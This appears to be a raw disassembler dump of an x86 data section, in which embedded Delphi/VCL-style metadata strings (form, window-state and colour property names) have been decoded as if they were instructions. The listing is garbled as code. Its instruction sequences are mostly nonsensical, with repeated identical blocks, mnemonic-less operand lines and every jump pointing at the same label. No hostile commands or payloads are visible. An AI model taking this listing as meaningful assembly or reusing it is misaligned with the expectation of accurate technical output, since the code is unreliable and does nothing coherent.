fiadd [ ebx ]
sub al 0xd5
inc ebx
add [ edx + ebx * 8 ] dl
inc ebx
add [ eax ] dl
hlt
add [ eax - 0x1a ] bl
inc ebx
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
inc ebx
add [ eax + 0x71 ] al
inc ebx
add [ ecx + ebx * 4 + 0x41 ] bh
sub [ eax + 0x43 ] ch
add [ ebx + ebx * 4 ] dh
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ eax - 0x6a ] dl
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 - 0x131fffbf ] al
inc esp
add [ ecx + 0x43 ] ch
add [ eax - 0x2bffbc1a ] cl
in eax 0x43
add [ esi - 0x2417ffbd ] bl
inc ebx
add [ eax ] cl
fadd [ ebx ]
and cl bl
inc ebx
add ah ah
inc ebx
add al ch
inc ebx
add ah ah
xchg ebp eax
inc ebx
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
jno r-xdata
inc ecx
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
mov ah 0xea
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax ] cl
rol [ eax + eax + 0x3 ] 0xc
push esp
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
rcr [ eax + 0x44c1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
retn 0x44
sub_44c345
inc esp
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
outsb
jne r-xdata
push ebx
je r-xdata
add eax 0x24000000
retn
outsd
imul ebp [ eax ] 0x41
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
inc eax
add [ eax + 0xf0044c3 ] bh
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
invd
dec ecx
dec edi
insb
inc esi
add bh bh
dec [ ebx + 0x44c3ecc0 ]
add [ edi ] cl
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
jae r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] bl
les eax [ eax + eax + 0x8 ]
jae r-xdata
insd
adc al 0x11
inc eax
add [ ecx ] al
jb r-xdata
retn
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
outsd
jb r-xdata
inc eax
add [ esp + eax * 8 + 0x44 ] ch
add [ ebx ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x3c ] ch
inc esp
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
inc esp
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
insb
insb
inc edx
popad
jb r-xdata
push cs
jo r-xdata
mov eax eax
mov esp 0x60044c4
inc esi
outsd
jb r-xdata
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
push eax
outsd
jb r-xdata
dec [ ebp - 0x3be3ffc0 ]
add bh bh
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
jb r-xdata
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
retn
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
insb
lds eax [ eax + eax + 0x9 ]
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or [ ecx + 0x4f ] cl
je r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
insd
inc esp
jae r-xdata
add [ eax ] al
add [ ebp + eax * 8 + 0x44 ] ch
add [ ecx ] cl
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
sar [ esp + eax * 8 + 0xc060044 ] 0x54
inc esp
popa
inc esp
popa
jne r-xdata
jo r-xdata
je r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add al dl
les eax [ eax + eax + 0xa ]
jo r-xdata
inc esp
add [ ebx ] al
lea eax [ eax ]
sbb al 0xc4
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + eax * 8 ] ah
inc esp
add [ 0x6d726f46 ] al
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
jae r-xdata
les eax [ eax + eax - 0x70 ]
aam 0xc4
inc esp
add [ ebx ] al
push 0x900044c4
popad
dec ebp
je r-xdata
push cs
je r-xdata
jne r-xdata
popad
je r-xdata
inc esp
add [ ebx ] al
or al 0x54
inc esp
add [ esi ] al
jns r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
lds eax [ eax + eax + 0x6 ]
inc eax
add [ esi + eax * 8 + 0x44 ] dl
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
add [ ebx ] al
lds eax [ eax + eax + 0x3 ]
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
arpl [ ecx + 0x4e ] sp
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
or dh al
inc esp
add [ esi ] al
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
or al 0xc6
inc esp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
jb r-xdata
jo r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
inc esi
outsd
jae r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al al
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
push esp
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add ah dh
adc [ eax ] al
or dh al
inc esp
add [ ebp - 0x3967ffc0 ] cl
inc esp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
insb
les eax [ eax + eax + 0x3 ]
inc esi
outsd
jb r-xdata
jo r-xdata
add [ esi ] al
andps xmm0 [ ebp + 0x66 ]
lds eax [ eax + eax + 0x3 ]
push esp
push eax
dec edi
ja r-xdata
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax ] cl
mov [ eax + eax + 0x6 ] 0x63
popad
dec esi
or [ eax + edx * 2 + 0x6f ] edx
les eax [ eax + eax + 0x3 ]
jae r-xdata
jb r-xdata
inc esi
outsd
jb r-xdata
dec esp
rol [ eax + eax + 0x64 ] 0x99
inc ecx
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x3843ffc0 ] cl
inc esp
add [ eax ] al
add cl [ eax ]
push es
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x540044c8 ] dh
0x44
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov esp 0x44c7
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
adc [ eax + 0x6f ] esi
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
insd
outsd
add [ eax ] al
rol ch 0x44
jae r-xdata
inc ebp
add [ eax - 0x50 ] bh
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ eax + 0x1c ] bh
inc ebp
add ah bl
scasb [ edi ]
inc ebx
add [ ebx + ebx * 8 + 0x43 ] dl
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 + 0x4000043 ] dh
inc ebp
add ah cl
add al [ ebp ]
in al dx
jae r-xdata
add [ esi + esi * 8 - 0x7afffbc ] bl
add [ ecx + ebx * 4 + 0x41 ] ah
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add dl dl
enter 0x44 0x42
0x44
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
add [ ebx + 0x45 ] ch
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add [ eax + 0x4004538 ] al
out dx al
inc esp
add [ eax + esi * 8 + 0x29600044 ] dh
inc ebp
add [ ecx + edi * 8 - 0x5e7ffbc ] bl
inc esp
add [ eax + 0x3c ] ah
inc ebp
add ah dl
test [ eax + eax + 0x64 ] 0x37
inc ebp
add [ esi + ebx + 0x45 ] al
add [ eax ] bl
cmp [ ebp ] eax
cld
add eax [ ebp ]
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
mov ah 0xc3
inc esp
add [ eax + 0x2 ] dl
add [ eax ] al
call 0x64450d92
add al [ eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
inc ebx
add [ eax + 0x4 ] bh
inc ebp
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
sub al 0xd5
inc ebx
add [ edx + ebx * 8 ] dl
inc ebx
add [ eax ] dl
hlt
inc esp
add [ eax + 0x34 ] bh
inc eax
add [ esp + ebx + 0x31cc0045 ] bh
inc eax
add al ch
xor [ eax ] eax
mov eax 0x580044f8
out 0x43 al
add [ eax ] ch
inc [ eax + eax - 0x1c ]
cmp eax 0xfa780041
inc esp
add [ edx + edi * 8 - 0x43fffbc ] dh
inc esp
add [ eax + 0x71 ] al
inc ebx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax ] bh
add al 0x45
add [ eax - 0x6a ] cl
inc ecx
add al bl
aas
inc ebp
add [ eax ] dl
cmc
inc esp
add [ ecx + 0x43 ] ch
add [ eax - 0x2bffbc1a ] cl
in eax 0x43
add [ esi - 0x2417ffbd ] bl
inc ebx
add [ eax ] bl
add [ ebp ] eax
and cl bl
inc ebx
add ah ah
inc ebx
add al ch
inc ebx
add [ edx + eax ] cl
inc ebp
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
jno r-xdata
push eax
clc
jb r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
sbb bh al
inc esp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
mov [ eax + eax + 0x8 ] 0xb
push esp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_44c794
clc
add al [ eax ]
add [ ecx + eax * 8 + 0x44 ] cl
add [ ecx + ebx * 4 + 0x41 ] ah
add [ esi + esi * 8 - 0x7afffbc ] bl
inc esp
add [ eax + 0x34 ] bh
inc eax
add [ esp + ebx + 0x31cc0045 ] bh
inc eax
add al ch
xor [ eax ] eax
mov eax 0x580044f8
out 0x43 al
add [ eax ] ch
inc [ eax + eax - 0x1c ]
cmp eax 0xfa780041
inc esp
add [ edx + edi * 8 - 0x43fffbc ] dh
inc esp
add [ eax + 0x71 ] al
inc ebx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax ] bh
add al 0x45
add [ eax - 0x6a ] cl
inc ecx
add al bl
aas
inc ebp
add [ eax ] dl
cmc
inc esp
add [ ecx + 0x43 ] ch
add [ eax - 0x2bffbc1a ] cl
in eax 0x43
add [ esi - 0x2417ffbd ] bl
inc ebx
add [ eax ] bl
add [ ebp ] eax
and cl bl
inc ebx
add ah ah
inc ebx
add al ch
inc ebx
add [ edx + eax ] cl
inc ebp
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
jno r-xdata
inc ebp
add [ eax - 0x50 ] bh
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ eax + 0x1c ] bh
inc ebp
add ah bl
scasb [ edi ]
inc ebx
add [ ebx + ebx * 8 + 0x43 ] dl
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 + 0x4000043 ] dh
inc ebp
add ah cl
add al [ ebp ]
in al dx
jae r-xdata
add [ ebx + 0x45 ] ch
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add [ eax + 0x4004538 ] al
out dx al
inc esp
add [ eax + esi * 8 + 0x29600044 ] dh
inc ebp
add [ ecx + edi * 8 - 0x5e7ffbc ] bl
inc esp
add [ eax + 0x3c ] ah
inc ebp
add ah dl
test [ eax + eax + 0x64 ] 0x37
inc ebp
add [ esi + ebx + 0x45 ] al
add [ eax ] bl
cmp [ ebp ] eax
cld
add eax [ ebp ]
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
mov ah 0xc3
inc esp
add [ eax + 0x2 ] dl
add [ eax ] al
call 0x64450d92
add al [ eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
inc ebx
add [ eax + 0x4 ] bh
inc ebp
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
sub al 0xd5
inc ebx
add [ edx + ebx * 8 ] dl
inc ebx
add [ eax ] dl
hlt
sub_44c84a
inc esp
add [ ebx + ecx ] bl
inc ebp
add al ah
scasd [ edi ]
inc ebx
add al ah
pop ss
inc ebp
add [ eax + 0x1b ] al
inc ebp
add ah bh
sbb [ ebp ] eax
js r-xdata
inc ebp
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
jno r-xdata
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ eax + 0x1c ] bh
inc ebp
add ah bl
scasb [ edi ]
inc ebx
add [ ebx + ebx * 8 + 0x43 ] dl
inc ebp
add [ eax - 0x50 ] bh
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 + 0x4000043 ] dh
inc ebp
add ah cl
add al [ ebp ]
in al dx
jae r-xdata
add [ ebx + 0x45 ] ch
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add [ eax + 0x4004538 ] al
out dx al
inc esp
add [ eax + esi * 8 + 0x29600044 ] dh
inc ebp
add [ ecx + edi * 8 - 0x5e7ffbc ] bl
inc esp
add [ eax + 0x3c ] ah
inc ebp
add ah dl
test [ eax + eax + 0x64 ] 0x37
inc ebp
add [ esi + ebx + 0x45 ] al
add [ eax ] bl
cmp [ ebp ] eax
cld
add eax [ ebp ]
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
mov ah 0xc3
inc esp
add [ eax + 0x2 ] dl
add [ eax ] al
call 0x64450d92
add al [ eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
inc ebx
add [ eax + 0x4 ] bh
inc ebp
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
sub al 0xd5
inc ebx
add [ edx + ebx * 8 ] dl
inc ebx
add [ eax ] dl
hlt
sub_44ca78
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror bl 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 8 + 0x2f80044 ] dh
add [ eax ] al
jo r-xdata
test al 0xc2
inc esp
add [ 0x6f460500 ] cl
jb r-xdata
inc esp
add [ ecx + ebx * 4 + 0x41 ] ah
add [ esi + esi * 8 - 0x7afffbc ] bl
inc esp
add [ eax + 0x34 ] bh
inc eax
add [ esp + ebx + 0x31cc0045 ] bh
inc eax
add al ch
xor [ eax ] eax
mov eax 0x580044f8
out 0x43 al
add [ eax ] ch
inc [ eax + eax - 0x1c ]
cmp eax 0xfa780041
inc esp
add [ edx + edi * 8 - 0x43fffbc ] dh
inc esp
add [ eax + 0x71 ] al
inc ebx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax ] bh
add al 0x45
add [ eax - 0x6a ] cl
inc ecx
add al bl
aas
inc ebp
add [ eax ] dl
cmc
inc esp
add [ ecx + 0x43 ] ch
add [ eax - 0x2bffbc1a ] cl
in eax 0x43
add [ esi - 0x2417ffbd ] bl
inc ebx
add [ eax ] bl
add [ ebp ] eax
and cl bl
inc ebx
add ah ah
inc ebx
add al ch
inc ebx
add [ edx + eax ] cl
inc ebp
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
jno r-xdata
cdq
inc ecx
jae r-xdata
inc ebp
add [ eax - 0x50 ] bh
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ eax + 0x1c ] bh
inc ebp
add ah bl
scasb [ edi ]
inc ebx
add [ ebx + ebx * 8 + 0x43 ] dl
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 + 0x4000043 ] dh
inc ebp
add ah cl
add al [ ebp ]
in al dx
jae r-xdata
add [ eax + r-xdata ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c004123 ] bl
add [ eax ] al
dec ah
inc bx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
add [ ebx + 0x45 ] ch
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add [ eax + 0x4004538 ] al
out dx al
inc esp
add [ eax + esi * 8 + 0x29600044 ] dh
inc ebp
add [ ecx + edi * 8 - 0x5e7ffbc ] bl
inc esp
add [ eax + 0x3c ] ah
inc ebp
add ah dl
test [ eax + eax + 0x64 ] 0x37
inc ebp
add [ esi + ebx + 0x45 ] al
add [ eax ] bl
cmp [ ebp ] eax
cld
add eax [ ebp ]
add eax 0x726f4654
insd
mov eax eax
ror bl 0x44
add [ edi ] al
add eax 0x726f4654
insd
ror dl 0x44
add [ eax - 0x36 ] dl
inc esp
add [ esi ] bl
add eax 0x6d726f46
jae r-xdata
inc ebx
add [ eax + 0x4 ] bh
inc ebp
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
sub al 0xd5
inc ebx
add [ edx + ebx * 8 ] dl
inc ebx
add [ eax ] dl
hlt
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
push [ ecx + eax * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
inc ebx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
outsd
outsb
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
dec eax
inc ecx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
insb
xor al 0x43
add [ ecx + eax ] ch
jmp [ eax - 0x24 ]
retn
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jl r-xdata
outsd
hlt
hlt
insb
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb865646f
les eax [ eax + eax + 0x28 ]
add al [ eax ]
[ eax - 0x5fffbaf4 ]
add [ eax ] al
jb r-xdata
popad
outsb
clc
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] dh
add bh bh
clc
je r-xdata
add [ eax + 0x430b001b ] al
insb
inc ebp
add [ eax + eax + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop eax
jae r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
jae r-xdata
add ah ch
add al [ eax ]
[ ecx + eax * 2 + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
add [ esi * 2 + 0x43 ] dl
add [ eax - 0x80000000 ] al
sbb al 0x0
add eax 0x6f6c6f43
jb r-xdata
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
adc [ eax ] al
pop esp
insd
inc ebx
add [ eax - 0x5fffbc8d ] cl
cmovne eax [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
pop es
inc ebx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
adc [ eax ] al
call 0x7143ce2a
inc ecx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
add ah dh
add al [ ebp ]
dec esp
add [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or eax [ ebx + 0x6c ]
imul ebp [ edi + 0x6e ] r-xdata
mov al [ 0x2400436d ]
add eax [ ebp ]
dec esp
add [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al [ eax ]
or al 0x43
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ ebp + ebp * 2 + 0x43 ] bl
pop ebp
add [ eax ] al
jmp [ eax ]
outsb
enter 0x4324 0x0
lds eax [ eax + eax + 0x31 ]
add al [ eax ]
push [ ecx ]
add al [ eax ]
jmp [ eax + 0x450f ]
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
outsd
insb
outsd
jb r-xdata
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x2b00ffff ] ah
fld [ ebx ]
add [ eax ] al
popad
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
